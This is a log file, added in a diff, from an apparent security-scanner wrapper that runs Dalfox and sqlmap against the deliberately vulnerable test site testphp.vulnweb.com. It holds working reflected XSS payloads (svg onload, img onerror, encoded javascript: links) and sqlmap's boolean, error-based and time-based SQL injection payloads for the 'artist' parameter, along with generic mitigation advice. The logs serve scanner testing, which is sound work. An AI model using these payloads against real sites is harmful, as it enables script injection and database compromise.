+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick","param":"artist","payload":"'\u003e\u003ca href=javas\u0026#99;ript:alert(1)/class=dalfox\u003eclick","evidence":"49 line:  syntax to use near ''\u003e\u003ca href=javas\u0026#99;ript:alert(1)/class=dalfox\u003eclick' at lin","cwe":"CWE-79","severity":"Medium","message_id":589,"message_str":"Reflected Payload in HTML: artist='\u003e\u003ca href=javas\u0026#99;ript:alert(1)/class=dalfox\u003eclick"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3CSvg%2Fonload%3Dalert%281%29+class%3Ddlafox%3E","param":"artist","payload":"\"\u003e\u003cSvg/onload=alert(1) class=dlafox\u003e","evidence":"49 line:  syntax to use near '\"\u003e\u003cSvg/onload=alert(1) class=dlafox\u003e' at line 1","cwe":"CWE-79","severity":"Medium","message_id":565,"message_str":"Reflected Payload in HTML: artist=\"\u003e\u003cSvg/onload=alert(1) class=dlafox\u003e"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E","param":"artist","payload":"'\"\u003e\u003cimg/src/onerror=.1|alert``\u003e","evidence":"49 line:  syntax to use near ''\"\u003e\u003cimg/src/onerror=.1|alert``\u003e' at line 1","cwe":"CWE-79","severity":"Medium","message_id":645,"message_str":"Reflected Payload in HTML: artist='\"\u003e\u003cimg/src/onerror=.1|alert``\u003e"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3Easd","param":"artist","payload":"\"\u003easd","evidence":"49 line:  syntax to use near '\"\u003easd' at line 1","cwe":"CWE-79","severity":"Medium","message_id":689,"message_str":"Reflected Payload in HTML: artist=\"\u003easd"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%27%3E%3CsVg%2Fonload%3Dalert%281%29+id%3Ddalfox%3E","param":"artist","payload":"'\u003e\u003csVg/onload=alert(1) id=dalfox\u003e","evidence":"49 line:  syntax to use near ''\u003e\u003csVg/onload=alert(1) id=dalfox\u003e' at line 1","cwe":"CWE-79","severity":"High","message_id":569,"message_str":"Triggered XSS Payload (found DOM Object): artist='\u003e\u003csVg/onload=alert(1) id=dalfox\u003e"},
+{}]
+
+2025-03-22 22:38:58,982 - ERROR - security_api.dalfox_scanner - Dalfox stderr: [37m[*] [0mParallel testing to 'testphp.vulnweb.com' => 4 urls
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:38:06 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:38:58 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:38:58 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:38:58 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+[37m[*] [0mFinish massive scan!
+
+2025-03-22 22:38:58,987 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:38:58,988 - INFO - security_api.__main__ - 
+Found 11 XSS vulnerabilities:
+2025-03-22 22:38:58,988 - INFO - security_api.__main__ - 
+=== Vulnerability #1 ===
+2025-03-22 22:38:58,989 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:58,989 - INFO - security_api.__main__ - Parameter: 
+2025-03-22 22:38:58,990 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:58,990 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:58,990 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:58,990 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter ''
+2025-03-22 22:38:58,992 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:58,993 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:58,993 - INFO - security_api.__main__ -   1. Sanitize input for parameter ''
+2025-03-22 22:38:58,993 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:58,994 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:58,995 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:58,995 - INFO - security_api.__main__ - 
+=== Vulnerability #2 ===
+2025-03-22 22:38:58,996 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:58,996 - INFO - security_api.__main__ - Parameter: test
+2025-03-22 22:38:58,997 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:58,997 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:58,997 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:58,998 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'test'
+2025-03-22 22:38:58,998 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:58,999 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:58,999 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'test'
+2025-03-22 22:38:59,000 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,000 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,001 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,001 - INFO - security_api.__main__ - 
+=== Vulnerability #3 ===
+2025-03-22 22:38:59,003 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,003 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,003 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,003 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,004 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,004 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,005 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,005 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,006 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,006 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,007 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,007 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,008 - INFO - security_api.__main__ - 
+=== Vulnerability #4 ===
+2025-03-22 22:38:59,008 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,009 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,010 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,010 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,010 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,011 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,011 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,012 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,012 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,013 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,014 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,014 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,015 - INFO - security_api.__main__ - 
+=== Vulnerability #5 ===
+2025-03-22 22:38:59,015 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,016 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,016 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,017 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,017 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,018 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,018 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,019 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,019 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,020 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,021 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,021 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,022 - INFO - security_api.__main__ - 
+=== Vulnerability #6 ===
+2025-03-22 22:38:59,022 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,023 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,023 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,024 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,024 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,025 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,026 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,027 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,027 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,028 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,029 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,029 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,030 - INFO - security_api.__main__ - 
+=== Vulnerability #7 ===
+2025-03-22 22:38:59,030 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,031 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,031 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,032 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,033 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,033 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,034 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,034 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,035 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,035 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,036 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,036 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,037 - INFO - security_api.__main__ - 
+=== Vulnerability #8 ===
+2025-03-22 22:38:59,038 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,038 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,038 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,039 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,040 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,040 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,041 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,042 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,042 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,043 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,043 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,044 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,044 - INFO - security_api.__main__ - 
+=== Vulnerability #9 ===
+2025-03-22 22:38:59,045 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,045 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,045 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,046 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,046 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,046 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,048 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,049 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,049 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,050 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,050 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,052 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,052 - INFO - security_api.__main__ - 
+=== Vulnerability #10 ===
+2025-03-22 22:38:59,052 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,053 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,053 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,053 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,054 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,054 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,055 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,057 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,058 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,058 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,059 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,059 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,060 - INFO - security_api.__main__ - 
+=== Vulnerability #11 ===
+2025-03-22 22:38:59,061 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:38:59,061 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:38:59,061 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:38:59,062 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:38:59,062 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:38:59,063 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:38:59,064 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:38:59,065 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:38:59,065 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:38:59,066 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:38:59,067 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:38:59,068 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:38:59,069 - INFO - security_api.__main__ - 
+=== General Recommendations ===
+2025-03-22 22:38:59,069 - INFO - security_api.__main__ - - Implement proper input validation and output encoding
+2025-03-22 22:38:59,070 - INFO - security_api.__main__ - - Use Content Security Policy (CSP) headers
+2025-03-22 22:38:59,070 - INFO - security_api.__main__ - - Sanitize user input before rendering
+2025-03-22 22:38:59,070 - INFO - security_api.__main__ - - Use security frameworks or libraries for XSS protection
+2025-03-22 22:38:59,072 - INFO - security_api.__main__ - - Implement proper HTML escaping for dynamic content
+2025-03-22 22:39:10,601 - INFO - security_api.dalfox_scanner - Dalfox stdout: [
+{"type":"G","inject_type":"BUILTIN","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=%27","param":"","payload":"toGrepping","evidence":"","cwe":"","severity":"Low","message_id":54,"message_str":"Found dalfox-error-mysql1 via built-in grepping / payload: toGrepping"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=query%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E","param":"test","payload":"'\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e","evidence":"49 line:   syntax to use near '\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e'' at line 1","cwe":"CWE-79","severity":"High","message_id":203,"message_str":"Triggered XSS Payload (found DOM Object): test='\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E","param":"artist","payload":"'\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e","evidence":"49 line:  syntax to use near ''\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e' at line 1","cwe":"CWE-79","severity":"High","message_id":593,"message_str":"Triggered XSS Payload (found DOM Object): artist='\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e"},
+{}]
+
+2025-03-22 22:39:10,603 - ERROR - security_api.dalfox_scanner - Dalfox stderr: [37m[*] [0mParallel testing to 'testphp.vulnweb.com' => 4 urls
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:38:16 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:38:59 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:59 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:38:59 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:38:59 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:39:00 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:39:10 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:39:10 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:39:10 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+[37m[*] [0mFinish massive scan!
+
+2025-03-22 22:39:10,607 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:39:10,607 - INFO - security_api.__main__ - 
+Found 3 XSS vulnerabilities:
+2025-03-22 22:39:10,608 - INFO - security_api.__main__ - 
+=== Vulnerability #1 ===
+2025-03-22 22:39:10,608 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:39:10,609 - INFO - security_api.__main__ - Parameter: 
+2025-03-22 22:39:10,609 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:39:10,610 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:39:10,610 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:39:10,610 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter ''
+2025-03-22 22:39:10,611 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:39:10,611 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:39:10,612 - INFO - security_api.__main__ -   1. Sanitize input for parameter ''
+2025-03-22 22:39:10,612 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:39:10,612 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:39:10,613 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:39:10,614 - INFO - security_api.__main__ - 
+=== Vulnerability #2 ===
+2025-03-22 22:39:10,614 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:39:10,614 - INFO - security_api.__main__ - Parameter: test
+2025-03-22 22:39:10,615 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:39:10,615 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:39:10,616 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:39:10,616 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'test'
+2025-03-22 22:39:10,617 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:39:10,617 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:39:10,617 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'test'
+2025-03-22 22:39:10,618 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:39:10,618 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:39:10,619 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:39:10,619 - INFO - security_api.__main__ - 
+=== Vulnerability #3 ===
+2025-03-22 22:39:10,619 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:39:10,621 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:39:10,621 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:39:10,622 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:39:10,622 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:39:10,622 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:39:10,623 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:39:10,623 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:39:10,624 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:39:10,624 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:39:10,625 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:39:10,625 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:39:10,625 - INFO - security_api.__main__ - 
+=== General Recommendations ===
+2025-03-22 22:39:10,626 - INFO - security_api.__main__ - - Implement proper input validation and output encoding
+2025-03-22 22:39:10,626 - INFO - security_api.__main__ - - Use Content Security Policy (CSP) headers
+2025-03-22 22:39:10,627 - INFO - security_api.__main__ - - Sanitize user input before rendering
+2025-03-22 22:39:10,627 - INFO - security_api.__main__ - - Use security frameworks or libraries for XSS protection
+2025-03-22 22:39:10,628 - INFO - security_api.__main__ - - Implement proper HTML escaping for dynamic content
+2025-03-22 22:46:33,269 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:47:36,178 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:47:36,521 - INFO - security_api.__main__ - 
+Running SQLMap Scanner test...
+2025-03-22 22:47:36,522 - INFO - security_api.sqlmap_scanner - Starting SQLMap scan for http://example.com/product?id=1
+2025-03-22 22:50:51,198 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:50:51,592 - INFO - security_api.__main__ - 
+Running SQLMap Scanner test...
+2025-03-22 22:50:51,593 - INFO - security_api.sqlmap_test - Starting SQLMap scan test...
+2025-03-22 22:50:51,593 - INFO - root - Scanning URL: http://testphp.vulnweb.com/artists.php?artist=1
+2025-03-22 22:50:51,595 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:50:52,649 - INFO - root - ___
+2025-03-22 22:50:52,651 - INFO - root - __H__
+2025-03-22 22:50:52,651 - INFO - root - ___ ___[(]_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:50:52,651 - INFO - root - |_ -| . [)]     | .'| . |
+2025-03-22 22:50:52,651 - INFO - root - |___|_  [)]_|_|_|__,|  _|
+2025-03-22 22:50:52,652 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:50:52,653 - INFO - root - 
+2025-03-22 22:50:52,661 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:50:52,662 - INFO - root - 
+2025-03-22 22:50:52,662 - INFO - root - [*] starting @ 22:50:52 /2025-03-22/
+2025-03-22 22:50:52,663 - INFO - root - 
+2025-03-22 22:50:52,712 - INFO - root - [22:50:52] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:50:52,736 - INFO - root - [22:50:52] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9b5pre) Gecko/2008030706 Firefox/3.0b5pre' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:50:52,794 - INFO - root - [22:50:52] [INFO] resuming back-end DBMS 'mysql'
+2025-03-22 22:50:54,235 - INFO - root - [22:50:54] [INFO] testing connection to the target URL
+2025-03-22 22:50:54,779 - INFO - root - sqlmap resumed the following injection point(s) from stored session:
+2025-03-22 22:50:54,780 - INFO - root - ---
+2025-03-22 22:50:54,780 - INFO - root - Parameter: artist (GET)
+2025-03-22 22:50:54,781 - INFO - root - Type: boolean-based blind
+2025-03-22 22:50:54,781 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:50:54,781 - INFO - root - Payload: artist=1 AND 8260=8260
+2025-03-22 22:50:54,782 - INFO - root - 
+2025-03-22 22:50:54,782 - INFO - root - Type: error-based
+2025-03-22 22:50:54,782 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:50:54,784 - INFO - root - Payload: artist=1 AND GTID_SUBSET(CONCAT(0x71716b7171,(SELECT (ELT(3128=3128,1))),0x716b717071),3128)
+2025-03-22 22:50:54,784 - INFO - root - 
+2025-03-22 22:50:54,784 - INFO - root - Type: time-based blind
+2025-03-22 22:50:54,785 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
